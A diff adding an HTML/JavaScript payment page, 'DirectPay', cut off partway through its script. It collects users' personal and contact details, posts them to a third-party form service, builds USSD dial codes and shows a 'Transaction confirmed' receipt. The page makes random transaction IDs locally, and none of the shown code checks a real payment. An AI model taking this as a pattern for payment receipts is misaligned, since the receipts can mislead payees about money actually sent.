@@ -1,0 +1,1364 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover" />
+    <title>Business Portal | Merchant Registration & Payment</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #eef2f7 0%, #d4dfed 100%);
+            min-height: 100vh;
+            padding: 0.8rem;
+            overflow-x: hidden;
+        }
+
+        @media (min-width: 640px) {
+            body {
+                padding: 1rem;
+            }
+        }
+        @media (min-width: 1024px) {
+            body {
+                padding: 2rem 1.5rem;
+            }
+        }
+
+        .main-content {
+            max-width: 1300px;
+            margin: 0 auto;
+            transition: filter 0.3s ease;
+            overflow-x: hidden;
+        }
+
+        .main-content.blurred {
+            filter: blur(4px);
+            pointer-events: none;
+            user-select: none;
+        }
+
+        .front-card {
+            background: white;
+            border-radius: 1.5rem;
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25);
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .hero-section {
+            background: linear-gradient(135deg, #0b2b3f, #1a4a6e);
+            padding: 1rem;
+            color: white;
+            text-align: center;
+        }
+
+        .hero-section h1 {
+            font-size: 1.3rem;
+            word-break: break-word;
+        }
+        .hero-section p {
+            font-size: 0.75rem;
+        }
+
+        @media (min-width: 640px) {
+            .hero-section {
+                padding: 1.2rem;
+            }
+            .hero-section h1 {
+                font-size: 1.6rem;
+            }
+        }
+        @media (min-width: 1024px) {
+            .hero-section {
+                padding: 1.8rem 2rem;
+            }
+            .hero-section h1 {
+                font-size: 2rem;
+            }
+        }
+
+        .two-col-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1rem;
+            padding: 1rem;
+        }
+
+        @media (min-width: 900px) {
+            .two-col-grid {
+                grid-template-columns: 1fr 1.2fr;
+                gap: 1.5rem;
+                padding: 1.5rem;
+            }
+        }
+        @media (min-width: 1200px) {
+            .two-col-grid {
+                gap: 2rem;
+                padding: 2rem;
+            }
+        }
+
+        .client-panel,
+        .merchant-panel {
+            background: white;
+            border-radius: 1.2rem;
+            padding: 1rem;
+            border: 1px solid #e2edf7;
+            overflow-x: hidden;
+        }
+
+        .info-card {
+            background: #f1f5f9;
+            border-radius: 1rem;
+            padding: 0.8rem;
+            margin-top: 0.8rem;
+            font-size: 0.8rem;
+            word-break: break-word;
+        }
+
+        .info-card p {
+            margin: 0.4rem 0;
+        }
+
+        .form-group {
+            margin-bottom: 0.9rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.3rem;
+            width: 100%;
+        }
+
+        .form-group label {
+            font-weight: 600;
+            font-size: 0.75rem;
+        }
+
+        input,
+        select {
+            padding: 0.6rem 0.7rem;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 0.9rem;
+            font-size: 0.8rem;
+            width: 100%;
+            max-width: 100%;
+        }
+
+        @media (min-width: 640px) {
+            .form-group {
+                margin-bottom: 1rem;
+            }
+            .form-group label {
+                font-size: 0.8rem;
+            }
+            input,
+            select {
+                padding: 0.7rem 0.8rem;
+                font-size: 0.85rem;
+            }
+        }
+
+        input.readonly-field,
+        select.readonly-field {
+            background-color: #f1f5f9;
+            cursor: not-allowed;
+        }
+
+        .radio-group-row {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+            background: #f8fafc;
+            padding: 0.4rem 0.7rem;
+            border-radius: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .policy-confirm-area {
+            background: #f1f5f9;
+            border-radius: 1rem;
+            padding: 0.6rem 0.8rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin: 0.8rem 0;
+        }
+
+        .pay-button,
+        .release-button,
+        .gen-id-button,
+        .reset-btn,
+        .send-receipt-btn {
+            width: 100%;
+            padding: 0.65rem;
+            border: none;
+            border-radius: 2rem;
+            font-weight: 700;
+            margin-top: 0.6rem;
+            cursor: pointer;
+            font-size: 0.85rem;
+        }
+
+        .pay-button {
+            background: #f97316;
+            color: white;
+        }
+        .release-button {
+            background: #2c7da0;
+            color: white;
+        }
+        .gen-id-button {
+            background: #8b5cf6;
+            color: white;
+            width: auto;
+            margin-top: 0;
+            padding: 0.6rem 1rem;
+            white-space: nowrap;
+        }
+        .reset-btn {
+            background: #e2e8f0;
+            color: #1e293b;
+        }
+        .send-receipt-btn {
+            background: #059669;
+            color: white;
+            width: auto;
+            padding: 0.5rem 1.2rem;
+            margin-top: 0.5rem;
+        }
+
+        .ussd-output {
+            background: #f1f5f9;
+            border-radius: 1rem;
+            padding: 0.7rem;
+            margin-top: 0.8rem;
+            border-left: 4px solid #f97316;
+            word-break: break-all;
+        }
+
+        .copy-btn,
+        .dial-btn {
+            background: #e2e8f0;
+            border: none;
+            padding: 0.3rem 0.7rem;
+            border-radius: 1rem;
+            cursor: pointer;
+            font-size: 0.7rem;
+            margin-right: 0.5rem;
+        }
+
+        .policy-modal-overlay,
+        .modal-overlay,
+        .receipt-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(4px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0.2s, opacity 0.2s;
+        }
+
+        .policy-modal-overlay.active,
+        .modal-overlay[style*="display: flex"],
+        .receipt-modal-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .policy-modal,
+        .registration-modal,
+        .receipt-modal {
+            background: white;
+            border-radius: 1.5rem;
+            max-width: 550px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .receipt-modal {
+            max-width: 600px;
+        }
+
+        .modal-header {
+            background: linear-gradient(135deg, #0b2b3f, #1a4a6e);
+            color: white;
+            padding: 1rem;
+            text-align: center;
+        }
+
+        .modal-body {
+            padding: 1rem;
+        }
+        .modal-footer {
+            padding: 0.8rem 1rem 1rem;
+        }
+
+        .btn-register {
+            background: #f97316;
+            color: white;
+            border: none;
+            padding: 0.7rem;
+            border-radius: 2rem;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        .error-text {
+            color: #dc2626;
+            font-size: 0.65rem;
+            margin-top: 0.2rem;
+        }
+
+        button,
+        input,
+        select {
+            max-width: 100%;
+        }
+
+        .inline-flex {
+            display: flex;
+            gap: 0.75rem;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+        }
+
+        .badge-donation {
+            display: inline-block;
+            background: #fef3c7;
+            color: #92400e;
+            font-size: 0.6rem;
+            padding: 0.1rem 0.6rem;
+            border-radius: 1rem;
+            font-weight: 600;
+            margin-left: 0.4rem;
+        }
+
+        .contact-note {
+            background: #f0f9ff;
+            border-radius: 0.6rem;
+            padding: 0.3rem 0.6rem;
+            font-size: 0.7rem;
+            color: #0369a1;
+            margin-top: 0.2rem;
+            display: inline-block;
+        }
+
+        .merchant-panel h3 {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            flex-wrap: wrap;
+        }
+
+        .transaction-badge {
+            background: #fef3c7;
+            color: #92400e;
+            font-size: 0.6rem;
+            padding: 0.1rem 0.6rem;
+            border-radius: 1rem;
+            font-weight: 600;
+            margin-left: 0.4rem;
+            display: inline-block;
+        }
+
+        /* Receipt styles */
+        .receipt-content {
+            background: #f8fafc;
+            border-radius: 0.8rem;
+            padding: 1rem;
+            font-size: 0.8rem;
+            border: 1px dashed #94a3b8;
+            margin: 0.5rem 0;
+        }
+
+        .receipt-content .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.25rem 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .receipt-content .row:last-child {
+            border-bottom: none;
+        }
+
+        .receipt-content .label {
+            font-weight: 600;
+            color: #475569;
+        }
+
+        .receipt-content .value {
+            color: #0f172a;
+            text-align: right;
+            max-width: 60%;
+            word-break: break-word;
+        }
+
+        .receipt-actions {
+            display: flex;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 0.75rem;
+        }
+
+        .receipt-actions button {
+            padding: 0.5rem 1.2rem;
+            border: none;
+            border-radius: 2rem;
+            font-weight: 600;
+            font-size: 0.8rem;
+            cursor: pointer;
+        }
+
+        .btn-sms {
+            background: #059669;
+            color: white;
+        }
+
+        .btn-copy-receipt {
+            background: #3b82f6;
+            color: white;
+        }
+
+        .btn-close-receipt {
+            background: #e2e8f0;
+            color: #1e293b;
+        }
+
+        .receipt-title {
+            text-align: center;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #0b2b3f;
+            margin-bottom: 0.5rem;
+        }
+
+        .receipt-subtitle {
+            text-align: center;
+            font-size: 0.7rem;
+            color: #64748b;
+            margin-bottom: 0.8rem;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- REGISTRATION POPUP -->
+    <div id="registrationModal" class="modal-overlay" style="display: flex;">
+        <div class="registration-modal">
+            <div class="modal-header">
+                <h2>📋 Private User</h2>
+                <p>Complete your personal profile</p>
+            </div>
+            <div class="modal-body">
+                <!-- Auto-fill button: hidden by default, appears only after Reset is clicked -->
+                <button id="autoFillRegistrationBtn" class="auto-fill-btn" style="margin-bottom: 0.75rem; display: none;">
+                    ⚡ Auto-Fill Previous Details
+                </button>
+
+                <div class="form-group">
+                    <label>🏢 Your name *</label>
+                    <input type="text" id="popupBizName" placeholder="Legal business name" />
+                </div>
+                <div class="form-group">
+                    <label>📍 Your address *</label>
+                    <input type="text" id="popupAddress" placeholder="Full address" />
+                </div>
+                <div class="form-group">
+                    <label>📧 Email address *</label>
+                    <input type="email" id="popupEmail" placeholder="contact@business.com" />
+                </div>
+                <div class="form-group">
+                    <label>👤 Recipient Name *</label>
+                    <input type="text" id="popupRecipientName" placeholder="Full name of recipient" />
+                </div>
+                <div class="form-group">
+                    <label>📞 9-digit phone OR 6-digit agent code *</label>
+                    <input type="text" id="popupIdentifier" placeholder="e.g., 761234567 or 892345" />
+                    <div id="popupIdentifierError" class="error-text"></div>
+                </div>
+
+                <!-- Contact Person fields -->
+                <div class="form-group">
+                    <label>👤 Contact Person Name *</label>
+                    <input type="text" id="popupContactName" placeholder="Full name of contact person" />
+                </div>
+                <div class="form-group">
+                    <label>📞 Contact Person Phone *</label>
+                    <input type="text" id="popupContactPhone" placeholder="e.g., 761234567" />
+                    <div id="popupContactPhoneError" class="error-text"></div>
+                </div>
+
+                <div class="form-group">
+                    <label>💼 Your position *</label>
+                    <select id="popupPosition">
+                        <option value="" disabled selected>– Select –</option>
+                        <option>Owner / CEO</option>
+                        <option>Manager</option>
+                        <option>Accountant</option>
+                        <option>Sales Representative</option>
+                        <option>Operations Lead</option>
+                        <option>Administrator</option>
+                    </select>
+                </div>
+                <div id="popupModalError" class="error-text" style="background:#fee2e2; padding:0.5rem; border-radius:0.5rem; display:none;"></div>
+            </div>
+            <div class="modal-footer">
+                <button id="confirmRegistrationBtn" class="btn-register">✅ Register & Continue</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- POLICY MODAL -->
+    <div id="policyModal" class="policy-modal-overlay">
+        <div class="policy-modal">
+            <div style="font-size: 2rem; text-align: center;">📜</div>
+            <p style="padding: 0 1rem;">
+                Dear valuable user!<br /><br />
+                NUSWeb thank you for choosing us. Please be reminded that your attention is required.<br /><br />
+                Type correct Names, Phone numbers, Amount, Addresses as mistakes may lead to miss‑transfers.<br /><br />
+                If issues arise from our side we take responsibility. Please use this application responsibly.
+            </p>
+            <div style="text-align: center; padding-bottom: 1.5rem;">
+                <button id="policyOkBtn">OK, I Understand</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- RECEIPT MODAL -->
+    <div id="receiptModal" class="receipt-modal-overlay">
+        <div class="receipt-modal">
+            <div class="modal-header">
+                <h2>🧾 Payment Receipt</h2>
+                <p>Transaction confirmed</p>
+            </div>
+            <div class="modal-body" id="receiptBody">
+                <!-- dynamically filled -->
+            </div>
+            <div class="modal-footer">
+                <div class="receipt-actions">
+                    <button class="btn-sms" id="sendReceiptSmsBtn">📱 Send via SMS</button>
+                    <button class="btn-copy-receipt" id="copyReceiptBtn">📋 Copy Receipt</button>
+                    <button class="btn-close-receipt" id="closeReceiptBtn">✕ Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div class="main-content blurred" id="mainContent">
+        <div class="front-card">
+            <div class="hero-section">
+                <h1>📋 DirectPay – Private</h1>
+                <p>Serial assigned • Transaction ID • USSD</p>
+            </div>
+            <div class="two-col-grid">
+                <!-- LEFT PANEL -->
+                <div class="client-panel">
+                    <h3>🔐 Registered User</h3>
+                    <div class="info-card">
+                        <p><strong>Name:</strong> <span id="displayBizName">—</span></p>
+                        <p><strong>Address:</strong> <span id="displayAddress">—</span></p>
+                        <p><strong>Identifier:</strong> <span id="displayIdentifier">—</span></p>
+                        <p><strong>Occupation:</strong> <span id="displayPosition">—</span></p>
+                        <p><strong>Recipient:</strong> <span id="displayRecipientName">—</span></p>
+                        <p><strong>Contact Person:</strong> <span id="displayContactName">—</span></p>
+                        <p><strong>Contact Phone:</strong> <span id="displayContactPhone">—</span></p>
+                    </div>
+                    <button id="resetRegistrationBtn" class="reset-btn">🔄 Reset & Register New Client</button>
+                </div>
+
+                <!-- RIGHT PANEL -->
+                <div class="merchant-panel">
+                    <h3>📄 User Details</h3>
+
+                    <div class="form-group">
+                        <label>User name</label>
+                        <input type="text" id="merchantBizName" class="readonly-field" readonly />
+                    </div>
+                    <div class="form-group">
+                        <label>Address</label>
+                        <input type="text" id="merchantAddress" class="readonly-field" readonly />
+                    </div>
+                    <div class="form-group">
+                        <label>Identifier</label>
+                        <input type="text" id="merchantIdentifier" class="readonly-field" readonly />
+                    </div>
+                    <div class="form-group">
+                        <label>Occupation</label>
+                        <input type="text" id="merchantPosition" class="readonly-field" readonly />
+                    </div>
+
+                    <!-- Contact Person fields (pre-filled from registration) -->
+                    <div class="form-group">
+                        <label>👤 Contact Person</label>
+                        <input type="text" id="merchantContactName" class="readonly-field" readonly />
+                    </div>
+                    <div class="form-group">
+                        <label>📞 Contact Phone</label>
+                        <input type="text" id="merchantContactPhone" class="readonly-field" readonly />
+                    </div>
+
+                    <div class="form-group">
+                        <label>🔢 Serial Number</label>
+                        <input type="text" id="serialNumberField" class="readonly-field" readonly value="--" />
+                    </div>
+
+                    <div class="form-group">
+                        <label>💰 Amount (Le) *</label>
+                        <input type="number" id="amountInput" placeholder="Enter amount" />
+                        <div id="amountError" class="error-text"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>📝 Recipient Name *</label>
+                        <input type="text" id="recipientNameField" class="readonly-field" readonly placeholder="Auto-filled" />
+                    </div>
+
+                    <!-- TRANSACTION CATEGORY DROPDOWN -->
+                    <div class="form-group">
+                        <label>📂 Transaction Category *</label>
+                        <select id="transactionCategory">
+                            <option value="" disabled selected>– Select transaction category –</option>
+                            <option value="Pay">Pay</option>
+                            <option value="Buy Good">Buy Good</option>
+                            <option value="Subscription">Subscription</option>
+                            <option value="Services">Services</option>
+                            <option value="Education">Education</option>
+                            <option value="Transport">Transport</option>
+                            <option value="Buy Product">Buy Product</option>
+                            <option value="Transfer">Transfer</option>
+                            <option value="Donation">Donation</option>
+                            <option value="Gifting">Gifting</option>
+                            <option value="Others">Others</option>
+                        </select>
+                        <div id="transactionCategoryError" class="error-text"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>🔖 Transaction ID <span style="color:#dc2626;">*</span></label>
+                        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
+                            <input type="text" id="transactionIdField" class="readonly-field" readonly style="flex:1;" />
+                            <button id="generateIdBtn" class="gen-id-button">🔄 Generate</button>
+                        </div>
+                        <div id="txIdError" class="error-text"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>📄 Transaction agreement</label>
+                        <div class="radio-group-row">
+                            <label><input type="radio" name="transactionAgreement" value="Yes" /> ✅ Yes</label>
+                            <label><input type="radio" name="transactionAgreement" value="No" /> ❌ No</label>
+                        </div>
+                    </div>
+
+                    <div class="policy-confirm-area">
+                        <button id="showPolicyBtn" style="background:#1e293b; color:white; border:none; padding:0.4rem 0.8rem; border-radius:2rem; font-size:0.75rem;">📜 Read Policy</button>
+                        <span id="policyStatusMsg" style="color:#b91c1c; font-size:0.7rem;">⚠️ Not confirmed</span>
+                    </div>
+
+                    <button id="releaseFundsBtn" class="release-button">📞 Release Funds (Open Dialer)</button>
+                    <div id="ussdOutputArea" style="display:none;" class="ussd-output">
+                        <strong>USSD Code:</strong><br />
+                        <code id="ussdCodeText" style="word-break:break-all;"></code><br />
+                        <button id="copyUssdBtn" class="copy-btn">📋 Copy</button>
+                        <button id="dialUssdBtn" class="dial-btn">📞 Open Dialer</button>
+                    </div>
+
+                    <button id="payBtn" class="pay-button">💰 PAY</button>
+                    <div id="merchantFeedback" style="display:none; margin-top:0.8rem; padding:0.6rem; border-radius:1rem; font-size:0.75rem;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ========== CONFIG ==========
+            const REGISTRATION_ENDPOINT = "https://formspree.io/f/xvznklyd";
+            const MERCHANT_ENDPOINT = "https://formspree.io/f/xeewandk";
+            const GROUP_ONE = ["076", "074", "073", "079", "078", "075"];
+            const GROUP_TWO = ["077", "088", "099", "080", "090", "030", "070", "033"];
+
+            let serialCounter = 1;
+            const SERIAL_KEY = "global_serial_counter";
+
+            // Store previous client data for auto-fill
+            let previousClientData = null;
+
+            function loadSerial() {
+                const stored = localStorage.getItem(SERIAL_KEY);
+                serialCounter = (stored && !isNaN(parseInt(stored))) ? parseInt(stored) : 1;
+                localStorage.setItem(SERIAL_KEY, serialCounter);
+            }
+
+            function incrementSerial() {
+                serialCounter++;
+                localStorage.setItem(SERIAL_KEY, serialCounter);
+            }
+
+            function randDigits(len) {
+                return Math.floor(Math.random() * Math.pow(10, len)).toString().padStart(len, '0');
+            }
+
+            function genTxId() {
+                return `NW${randDigits(7)}.${randDigits(5)}.M${randDigits(7)}`;
+            }
+
+            // DOM refs
+            const regModal = document.getElementById('registrationModal');
+            const mainContent = document.getElementById('mainContent');
+            const popupBiz = document.getElementById('popupBizName');
+            const popupAddr = document.getElementById('popupAddress');
+            const popupEmail = document.getElementById('popupEmail');
+            const popupRec = document.getElementById('popupRecipientName');
+            const popupId = document.getElementById('popupIdentifier');
+            const popupPos = document.getElementById('popupPosition');
+            const popupContactName = document.getElementById('popupContactName');
+            const popupContactPhone = document.getElementById('popupContactPhone');
+            const popupContactPhoneError = document.getElementById('popupContactPhoneError');
+            const regBtn = document.getElementById('confirmRegistrationBtn');
+            const popupErrorSpan = document.getElementById('popupModalError');
+            const idHint = document.getElementById('popupIdentifierError');
+
+            const autoFillRegBtn = document.getElementById('autoFillRegistrationBtn');
+
+            const mBiz = document.getElementById('merchantBizName');
+            const mAddr = document.getElementById('merchantAddress');
+            const mId = document.getElementById('merchantIdentifier');
+            const mPos = document.getElementById('merchantPosition');
+            const mContactName = document.getElementById('merchantContactName');
+            const mContactPhone = document.getElementById('merchantContactPhone');
+            const serialField = document.getElementById('serialNumberField');
+            const amount = document.getElementById('amountInput');
+            const amountErr = document.getElementById('amountError');
+            const recipientField = document.getElementById('recipientNameField');
+            const transactionCat = document.getElementById('transactionCategory');
+            const transactionCatError = document.getElementById('transactionCategoryError');
+            const txField = document.getElementById('transactionIdField');
+            const genTx = document.getElementById('generateIdBtn');
+            const txErr = document.getElementById('txIdError');
+            const agreeRadios = document.querySelectorAll('input[name="transactionAgreement"]');
+            const showPolicyBtn = document.getElementById('showPolicyBtn');
+            const policyStatusSpan = document.getElementById('policyStatusMsg');
+            const release = document.getElementById('releaseFundsBtn');
+            const ussdArea = document.getElementById('ussdOutputArea');
+            const ussdCodeSpan = document.getElementById('ussdCodeText');
+            const copyUssd = document.getElementById('copyUssdBtn');
+            const dialUssd = document.getElementById('dialUssdBtn');
+            const pay = document.getElementById('payBtn');
+            const feedback = document.getElementById('merchantFeedback');
+            const resetAllBtn = document.getElementById('resetRegistrationBtn');
+
+            const dispBiz = document.getElementById('displayBizName');
+            const dispAddr = document.getElementById('displayAddress');
+            const dispId = document.getElementById('displayIdentifier');
+            const dispPos = document.getElementById('displayPosition');
+            const dispRec = document.getElementById('displayRecipientName');
+            const dispContactName = document.getElementById('displayContactName');
+            const dispContactPhone = document.getElementById('displayContactPhone');
+
+            // Receipt modal
+            const receiptModal = document.getElementById('receiptModal');
+            const receiptBody = document.getElementById('receiptBody');
+            const sendReceiptSmsBtn = document.getElementById('sendReceiptSmsBtn');
+            const copyReceiptBtn = document.getElementById('copyReceiptBtn');
+            const closeReceiptBtn = document.getElementById('closeReceiptBtn');
+
+            // Policy modal
+            const policyModal = document.getElementById('policyModal');
+            const policyOk = document.getElementById('policyOkBtn');
+            let policyOkFlag = false;
+
+            showPolicyBtn.onclick = () => policyModal.classList.add('active');
+            policyOk.onclick = () => {
+                policyOkFlag = true;
+                policyStatusSpan.innerHTML = "✅ Policy agreed";
+                policyStatusSpan.style.color = "#15803d";
+                policyModal.classList.remove('active');
+            };
+
+            // ---------- client storage ----------
+            function isRegistered() { return localStorage.getItem('clientRegistered') === 'true'; }
+
+            function saveClient(data) {
+                localStorage.setItem('clientRegistered', 'true');
+                localStorage.setItem('clientData', JSON.stringify(data));
+            }
+
+            function clearClient() {
+                localStorage.removeItem('clientRegistered');
+                localStorage.removeItem('clientData');
+            }
+
+            function fillForms(data) {
+                mBiz.value = data.businessName || '';
+                mAddr.value = data.address || '';
+                mId.value = data.identifier || '';
+                mPos.value = data.position || '';
+                mContactName.value = data.contactName || '';
+                mContactPhone.value = data.contactPhone || '';
+                serialField.value = data.serialNumber || '--';
+                recipientField.value = data.recipientName || '';
+                dispBiz.innerText = data.businessName || '—';
+                dispAddr.innerText = data.address || '—';
+                dispId.innerText = data.identifier || '—';
+                dispPos.innerText = data.position || '—';
+                dispRec.innerText = data.recipientName || '—';
+                dispContactName.innerText = data.contactName || '—';
+                dispContactPhone.innerText = data.contactPhone || '—';
+            }
+
+            function loadSession() {
+                if (isRegistered()) {
+                    const saved = localStorage.getItem('clientData');
+                    if (saved) { try { fillForms(JSON.parse(saved)); } catch (e) {} }
+                    if (!txField.value) txField.value = genTxId();
+                    regModal.style.display = 'none';
+                    mainContent.classList.remove('blurred');
+                    // Hide auto-fill button when modal is closed
+                    autoFillRegBtn.style.display = 'none';
+                } else {
+                    regModal.style.display = 'flex';
+                    mainContent.classList.add('blurred');
+                    // Hide auto-fill button on initial load
+                    autoFillRegBtn.style.display = 'none';
+                    mBiz.value = '';
+                    mAddr.value = '';
+                    mId.value = '';
+                    mPos.value = '';
+                    mContactName.value = '';
+                    mContactPhone.value = '';
+                    serialField.value = '--';
+                    recipientField.value = '';
+                    dispBiz.innerText = '—';
+                    dispAddr.innerText = '—';
+                    dispId.innerText = '—';
+                    dispPos.innerText = '—';
+                    dispRec.innerText = '—';
+                    dispContactName.innerText = '—';
+                    dispContactPhone.innerText = '—';
+                    txField.value = '';
+                }
+            }
+
+            function showPopupErr(msg) {
+                popupErrorSpan.style.display = 'block';
+                popupErrorSpan.innerText = msg;
+                setTimeout(() => popupErrorSpan.style.display = 'none', 3000);
+            }
+
+            function validateReg() {
+                const biz = popupBiz.value.trim();
+                const addr = popupAddr.value.trim();
+                const email = popupEmail.value.trim();
+                const rec = popupRec.value.trim();
+                const id = popupId.value.trim();
+                const pos = popupPos.value;
+                const cName = popupContactName.value.trim();
+                const cPhone = popupContactPhone.value.trim();
+
+                if (!biz || !addr || !email || !rec || !id || !pos || !cName || !cPhone) {
+                    showPopupErr("All fields required.");
+                    return false;
+                }
+                if (!/^\S+@\S+\.\S+$/.test(email)) {
+                    showPopupErr("Invalid email.");
+                    return false;
+                }
+                const is9d = /^\d{9}$/.test(id);
+                const is6c = /^[A-Za-z0-9]{6}$/.test(id);
+                if (!is9d && !is6c) {
+                    showPopupErr("Identifier: 9 digits or 6 alphanumeric.");
+                    return false;
+                }
+                if (!/^\d{9}$/.test(cPhone)) {
+                    popupContactPhoneError.innerText = "Contact phone must be 9 digits.";
+                    return false;
+                } else {
+                    popupContactPhoneError.innerText = "";
+                }
+                return true;
+            }
+
+            // ---------- AUTO-FILL function (restores previous details) ----------
+            function autoFillRegistration() {
+                if (!previousClientData) {
+                    // No previous data to restore
+                    const tempMsg = document.createElement('div');
+                    tempMsg.innerText = "ℹ️ No previous client data to restore.";
+                    tempMsg.style.background = "#fef9c3";
+                    tempMsg.style.padding = "0.4rem";
+                    tempMsg.style.borderRadius = "0.8rem";
+                    tempMsg.style.fontSize = "0.7rem";
+                    tempMsg.style.textAlign = "center";
+                    tempMsg.style.marginTop = "0.5rem";
+                    const existing = document.querySelector('.auto-fill-feedback');
+                    if (existing) existing.remove();
+                    tempMsg.classList.add('auto-fill-feedback');
+                    const modalBody = document.querySelector('#registrationModal .modal-body');
+                    modalBody.appendChild(tempMsg);
+                    setTimeout(() => tempMsg.remove(), 2500);
+                    return;
+                }
+
+                // Fill the form with previous data
+                popupBiz.value = previousClientData.businessName || '';
+                popupAddr.value = previousClientData.address || '';
+                popupEmail.value = previousClientData.email || '';
+                popupRec.value = previousClientData.recipientName || '';
+                popupId.value = previousClientData.identifier || '';
+                popupContactName.value = previousClientData.contactName || '';
+                popupContactPhone.value = previousClientData.contactPhone || '';
+
+                // Set position dropdown
+                const posValue = previousClientData.position || '';
+                const options = popupPos.options;
+                let found = false;
+                for (let i = 0; i < options.length; i++) {
+                    if (options[i].value === posValue) {
+                        popupPos.selectedIndex = i;
+                        found = true;
+                        break;
+                    }
+                }
+                if (!found) popupPos.selectedIndex = 0; // select placeholder
+
+                // Clear any previous errors
+                if (idHint) idHint.innerText = "✓ Restored previous details";
+                popupContactPhoneError.innerText = "";
+
+                const tempMsg = document.createElement('div');
+                tempMsg.innerText = "✨ Previous client details restored!";
+                tempMsg.style.background = "#e0f2fe";
+                tempMsg.style.padding = "0.4rem";
+                tempMsg.style.borderRadius = "0.8rem";
+                tempMsg.style.fontSize = "0.7rem";
+                tempMsg.style.textAlign = "center";
+                tempMsg.style.marginTop = "0.5rem";
+                const existing = document.querySelector('.auto-fill-feedback');
+                if (existing) existing.remove();
+                tempMsg.classList.add('auto-fill-feedback');
+                const modalBody = document.querySelector('#registrationModal .modal-body');
+                modalBody.appendChild(tempMsg);
+                setTimeout(() => tempMsg.remove(), 2500);
+            }
+
+            if (autoFillRegBtn) {
+                autoFillRegBtn.addEventListener('click', autoFillRegistration);
+            }
+
+            // ---------- complete registration ----------
+            function completeRegistration() {
+                if (!validateReg()) return;
+                const serialNum = `SN-${String(serialCounter).padStart(5, '0')}`;
+                const clientData = {
+                    businessName: popupBiz.value.trim(),
+                    address: popupAddr.value.trim(),
+                    email: popupEmail.value.trim(),
+                    recipientName: popupRec.value.trim(),
+                    identifier: popupId.value.trim(),
+                    position: popupPos.value,
+                    contactName: popupContactName.value.trim(),
+                    contactPhone: popupContactPhone.value.trim(),
+                    serialNumber: serialNum,
+                    registeredAt: new Date().toISOString()
+                };
+                saveClient(clientData);
+                fillForms(clientData);
+                incrementSerial();
+                txField.value = genTxId();
+                regModal.style.display = 'none';
+                mainContent.classList.remove('blurred');
+                // Hide auto-fill button after registration
+                autoFillRegBtn.style.display = 'none';
+                // Clear previousClientData after successful registration
+                previousClientData = null;
+                // Reset popup fields to empty for next registration
+                popupBiz.value = '';
+                popupAddr.value = '';
+                popupEmail.value = '';
+                popupRec.value = '';
+                popupId.value = '';
+                popupPos.value = '';
+                popupContactName.value = '';
+                popupContactPhone.value = '';
+                popupContactPhoneError.innerText = '';
+
+                const fd = new FormData();
+                fd.append("type", "client_registration");
+                fd.append("business_name", clientData.businessName);
+                fd.append("address", clientData.address);
+                fd.append("email", clientData.email);
+                fd.append("recipient_name", clientData.recipientName);
+                fd.append("identifier", clientData.identifier);
+                fd.append("position", clientData.position);
+                fd.append("contact_name", clientData.contactName);
+                fd.append("contact_phone", clientData.contactPhone);
+                fd.append("assigned_serial", clientData.serialNumber);
+                fetch(REGISTRATION_ENDPOINT, { method: "POST", body: fd }).catch(e => console.log);
+            }
+
+            function resetMerchantOnly() {
+                amount.value = '';
+                transactionCat.value = '';
+                transactionCatError.innerText = '';
+                agreeRadios.forEach(r => r.checked = false);
+                amountErr.innerText = '';
+                ussdArea.style.display = 'none';
+                txField.value = genTxId();
+                txErr.innerText = '';
+                if (isRegistered()) {
+                    const saved = localStorage.getItem('clientData');
+                    if (saved) {
+                        try {
+                            const d = JSON.parse(saved);
+                            recipientField.value = d.recipientName || '';
+                            mContactName.value = d.contactName || '';
+                            mContactPhone.value = d.contactPhone || '';
+                            dispContactName.innerText = d.contactName || '—';
+                            dispContactPhone.innerText = d.contactPhone || '—';
+                        } catch (e) {}
+                    }
+                }
+            }
+
+            function fullReset() {
+                // Capture current client data before clearing (if any)
+                if (isRegistered()) {
+                    const saved = localStorage.getItem('clientData');
+                    if (saved) {
+                        try {
+                            previousClientData = JSON.parse(saved);
+                        } catch (e) {
+                            previousClientData = null;
+                        }
+                    } else {
+                        previousClientData = null;
+                    }
+                } else {
+                    previousClientData = null;
+                }
+
+                clearClient();
+                mBiz.value = '';
+                mAddr.value = '';
+                mId.value = '';
+                mPos.value = '';
+                mContactName.value = '';
+                mContactPhone.value = '';
+                serialField.value = '--';
+                recipientField.value = '';
